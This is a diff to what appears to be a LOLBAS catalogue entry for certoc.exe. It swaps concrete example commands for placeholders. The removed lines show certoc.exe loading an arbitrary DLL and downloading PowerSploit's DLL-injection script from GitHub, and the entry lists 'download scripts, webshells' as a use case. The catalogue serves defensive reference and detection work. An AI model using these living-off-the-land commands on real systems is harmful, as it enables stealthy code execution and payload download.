@@ -4,7 +4,7 @@ Description: Used for installing certificates
 Author: 'Ensar Samil'
 Created: 2021-10-07
 Commands:
-  - Command: certoc.exe -LoadDLL "C:\test\calc.dll"
+  - Command: certoc.exe -LoadDLL {PATH_ABSOLUTE:.dll}
     Description: Loads the target DLL file
     Usecase: Execute code within DLL file
     Category: Execute
@@ -13,7 +13,7 @@ Commands:
     OperatingSystem: Windows Server 2022
     Tags:
       - Execute: DLL
-  - Command: certoc.exe -GetCACAPS https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/CodeExecution/Invoke-DllInjection.ps1
+  - Command: certoc.exe -GetCACAPS {REMOTEURL:.ps1}
     Description: Downloads text formatted files
     Usecase: Download scripts, webshells etc.
     Category: Download
